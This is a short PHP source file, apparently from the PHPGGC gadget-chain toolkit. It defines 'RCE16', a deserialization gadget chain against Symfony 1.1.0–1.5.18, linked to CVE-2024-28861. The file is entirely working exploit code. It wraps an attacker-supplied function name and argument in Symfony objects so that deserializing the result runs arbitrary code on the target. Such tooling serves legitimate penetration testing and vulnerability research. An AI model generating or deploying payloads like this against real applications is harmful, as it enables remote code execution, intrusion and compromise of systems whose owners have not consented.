<?php

namespace GadgetChain\Symfony;

class RCE16 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.0 <= 1.5.18';
    public static $vector = 'Serializable';
    public static $author = 'darkpills';
    public static $information = 'CVE-2024-28861';

    public function generate(array $parameters)
    {
        $escaper = new \sfOutputEscaperArrayDecorator($parameters['function'], array($parameters['parameter']));
        $tableInfo = new \sfNamespacedParameterHolder($escaper); 
        return $tableInfo;
    }
}
